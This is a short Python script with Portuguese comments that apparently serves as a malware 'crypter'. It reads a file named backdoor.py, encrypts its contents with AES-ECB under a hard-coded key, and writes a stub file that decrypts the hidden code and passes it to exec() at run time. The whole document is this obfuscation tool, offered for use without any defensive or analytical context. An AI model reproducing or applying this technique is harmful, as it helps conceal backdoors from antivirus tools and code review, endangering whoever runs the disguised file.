from Crypto.Cipher import AES
from base64 import b64encode

BLOCO = 16
PAD = '@'

def criptografar(conteudo, chave):

	# Criptografando dados
        extra = (BLOCO - len(conteudo)) % BLOCO
	aes = AES.new(chave, AES.MODE_ECB)
        cript = aes.encrypt(conteudo + PAD * extra)
        
	# Dados criptografados Base64(AES(conteudo))
	return b64encode(cript)

def criar_bd(path, output, chave):

	# Obtendo conteudo original
	backdoor_original = open(path, 'r')
	conteudo = backdoor_original.read()
	
	# Criptografando conteudo do backdoor original
	conteudo_cifrado = criptografar(conteudo, chave)

	# Criando Backdoor Criptografado
	payload = "from Crypto.Cipher import AES\n"
	payload += "from base64 import b64decode\n"
	payload += "aes = AES.new('%s', AES.MODE_ECB)\n" % chave
	payload += "exec(aes.decrypt(b64decode('%s')).rstrip('%s'))" % (conteudo_cifrado, PAD)

	# Criando novo arquivo '.py'
	backdoor_criptografado = open(output, 'w')
	backdoor_criptografado.write(payload)

	# The End
	backdoor_original.close()
	backdoor_criptografado.close()

criar_bd('backdoor.py', 'bd.py', '0123456789ABCDEF')
